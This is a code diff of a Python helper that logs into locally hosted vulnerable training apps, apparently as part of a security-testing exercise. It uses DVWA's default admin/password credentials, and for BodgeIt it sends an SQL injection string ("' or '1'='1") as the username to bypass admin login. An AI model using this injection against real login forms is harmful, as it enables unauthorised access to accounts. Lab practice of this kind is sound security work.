@@ -7,27 +7,29 @@ class customauth():
 	site = input("what site?")
 	# takes in the argument from the command line and decides which hardcoded authentication to use
 	def getsite(site):
-		#will ignore case of text by making it lower, use the admin and password credentials
-		if site.lower() == 'dvwa':
-			url = 'http://127.0.0.1/dvwa/login.php'
-			payload = {
-	    		'login'   : 'true',
-    	    		'action'  : 'login',
-			'username': 'admin',
-    	    		'password': 'password'
-	   		}
-			p = requests.post(url, data=payload)
-		#will ignore case of text by making it lower and uses sql injection for the admin login
-		elif site.lower() == 'bodgeit':
-			url = 'http://127.0.0.1:8080/bodgeit/login.jsp'
-			payload = {
-			'action'  : 'login',
-    	    		'username': "admin@thebodgeitstore.com' or '1'='1",
-    	    		'password': ''
-	    		}
-			p = requests.post(url, data=payload)
-		elif site.lower() != '':
-			url = site
-			p = requests.post(url)
-		print(p.text)
+		with requests.Session() as s:
+			#will ignore case of text by making it lower, use the admin and password credentials
+			if site.lower() == 'dvwa':
+				url = 'http://127.0.0.1/dvwa/login.php'
+				payload = {
+				'action'  : 'login',
+				'username': 'admin',
+    	    			'password': 'password'
+	   			}
+				s.post(url, data=payload)
+				r = s.get('http://127.0.0.1/dvwa/setup.php')
+			#will ignore case of text by making it lower and uses sql injection for the admin login
+			elif site.lower() == 'bodgeit':
+				url = 'http://127.0.0.1:8080/bodgeit/login.jsp'
+				payload = {
+				'action'  : 'login',
+    	    			'username': "admin@thebodgeitstore.com' or '1'='1",
+    	    			'password': ''
+	    			}
+				s.post(url, data=payload)
+				r = s.get('http://127.0.0.1:8080/bodgeit/admin.jsp')
+			elif site.lower() != '':
+				url = site
+				s.post(url)
+			print (r.text)
 	getsite(site)
